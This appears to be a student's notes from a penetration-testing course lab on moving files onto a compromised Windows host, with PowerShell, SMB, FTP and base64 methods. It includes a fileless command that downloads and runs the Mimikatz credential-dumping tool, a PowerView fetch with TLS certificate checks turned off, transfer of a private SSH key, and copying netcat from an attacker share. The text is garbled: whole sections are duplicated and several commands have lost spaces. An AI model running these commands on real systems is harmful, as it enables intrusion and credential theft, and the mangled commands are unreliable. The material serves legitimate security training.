Astaroth attack (fileless threat) - a malicious link with LNK file is double clicked > execute WMIC tool with /Format > download malicious javascript > javascript downloads payloads abusing Bitsadmin tool.

![image](Exported%20image%2020240712140343-0.png)  

Examples:  
We have access to MS02 and need to download from Pwnbox.

![image](Exported%20image%2020240712140343-1.png)  

1. Powershell Base64 Encode & Decode
    
    1. Check SSH Key Hash
    
    ```
    burray@htb[/htb]$md5sum id_rsa  
    4e301756a07ded0a2dd6953abf015278  id_rsa
    
    catid_rsa |base64 -w 0;echo
     We can then copy the output to powershell and decode
    PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("{OUTPUT}")
    The Get-FileHash cmdlet does the same thing md5sum does
    PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
    Powershell Web Downloads
    In any version of PowerShell the System.Net.WebClient call can be used to download a file over HTTP, HTTPS, or FTP. Below are methods for the class for downloading data.
    File Download
    PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')  
    PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
    
    PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')  
    Or using curl  
    PS C:\htb> Invoke-WebRequest [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) -UseBasicParsing -OutFile PowerView.ps1  
    (you may have to set PS C:\htb>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} to avoid SSL/TLS cert issues)
    
    SMB Downloads
    We can create an smbserver.py on our machine to use copy, move, and other tools
    
    Step 1. Create SMB Server  
    burray@htb[/htb]$sudoimpacket-smbserver share -smb2support /tmp/smbshare  
    Step 2. Copy File from server  
    C:\htb> copy [\\192.168.220.133\share\nc.exe](file:///\\192.168.220.133\share\nc.exe)  
    If windows blocks the connection we can set a user/pass on the server and mount it to windows  
    Step 2a. Create SMB Server with user/pass  
    burray@htb[/htb]$sudoimpacket-smbserver share -smb2support /tmp/smbshare -user test-password test  
    Step 2b. Mount server  
    C:\htb> net use n: [\\192.168.220.133\share](file:///\\192.168.220.133\share) /user:test test
    
    burray@htb
    [/htb]
    $
    sudo
    impacket-smbserver share -smb2support /tmp/smbshare
    
    
    C:\htb> copy 
    \\192.168.220.133\share\nc.exe
    
    
    
    burray@htb
    [/htb]
    $
    sudo
    impacket-smbserver share -smb2support /tmp/smbshare -user 
    test
    -password 
    test
    
    
    C:\htb> net use n: 
    \\192.168.220.133\share
     /user:test test
    
    burray@htb
    [/htb]
    $
    sudo
    python3 -m pyftpdlib --port 
    21
    
    
    PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
    
    
    C:\htb> echo open 192.168.49.128 > ftpcommand.txt
    ￼
    C:\htb> echo USER anonymous >> ftpcommand.txt
    ￼
    C:\htb> echo binary >> ftpcommand.txt
    ￼
    C:\htb> echo GET file.txt >> ftpcommand.txt
    ￼
    C:\htb> echo bye >> ftpcommand.txt
    ￼
    C:\htb> ftp -v -n -s:ftpcommand.txt
    ￼
    ftp> open 192.168.49.128
    ￼
    Log in with USER and PASS first.
    ￼
    ftp> USER anonymous
    ￼
    
    ftp> GET file.txt
    ￼
    ftp> bye
    ￼
    
    C:\htb>more file.txt
    ￼
    This is a test file
    
    
    
    
    
    
    
    
    
    
    
    
    ```
    
    3. Encode SSH Key to Base64
    
    catid_rsa |base64 -w 0;echo
    
    5. We can then copy the output to powershell and decode
    
    PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("{OUTPUT}")
    
    7. The Get-FileHash cmdlet does the same thing md5sum does
    
    PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
    
2. Powershell Web Downloads

In any version of PowerShell the System.Net.WebClient call can be used to download a file over HTTP, HTTPS, or FTP. Below are methods for the class for downloading data.

1. File Download

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')  
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

3. PowerShell DownloadString - Fileless Method

PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')  
Or using curl  
PS C:\htb> Invoke-WebRequest [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1) -UseBasicParsing -OutFile PowerView.ps1  
(you may have to set PS C:\htb>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} to avoid SSL/TLS cert issues)

5. SMB Downloads

We can create an smbserver.py on our machine to use copy, move, and other tools
 
Step 1. Create SMB Server  
burray@htb[/htb]$sudoimpacket-smbserver share -smb2support /tmp/smbshare  
Step 2. Copy File from server  
C:\htb> copy [\\192.168.220.133\share\nc.exe](file:///\\192.168.220.133\share\nc.exe)  
If windows blocks the connection we can set a user/pass on the server and mount it to windows  
Step 2a. Create SMB Server with user/pass  
burray@htb[/htb]$sudoimpacket-smbserver share -smb2support /tmp/smbshare -user test-password test  
Step 2b. Mount server  
C:\htb> net use n: [\\192.168.220.133\share](file:///\\192.168.220.133\share) /user:test test

9. FTP Downloads

Can use pyftpdlib to make an FTP server  
burray@htb[/htb]$sudopython3 -m pyftpdlib --port 21  
Then download with the Net.WebClient  
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
 
If we have a shell but not interactive we can create a command file for the client to download the target file.  
C:\htb> echo open 192.168.49.128 > ftpcommand.txt￼C:\htb> echo USER anonymous >> ftpcommand.txt￼C:\htb> echo binary >> ftpcommand.txt￼C:\htb> echo GET file.txt >> ftpcommand.txt￼C:\htb> echo bye >> ftpcommand.txt￼C:\htb> ftp -v -n -s:ftpcommand.txt￼ftp> open 192.168.49.128￼Log in with USER and PASS first.￼ftp> USER anonymous￼  
ftp> GET file.txt￼ftp> bye￼  
C:\htb>more file.txt￼This is a test file
 
If we access to a terminal we can encode a file to a base64 string then copy the output and do the reverse on our machine.

|
|
==Method== ==Description==
==[OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)== ==Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0).==
==[OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)== ==Returns the data from a resource without blocking the calling thread.==
==[DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)== ==Downloads data from a resource and returns a Byte array.==
==[DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)== ==Downloads data from a resource and returns a Byte array without blocking the calling thread.==
==[DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)== ==Downloads data from a resource to a local file.==
==[DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)== ==Downloads data from a resource to a local file without blocking the calling thread.==
==[DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)== ==Downloads a String from a resource and returns a String.==
==[DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0)== ==Downloads a String from a resource without blocking the calling thread.==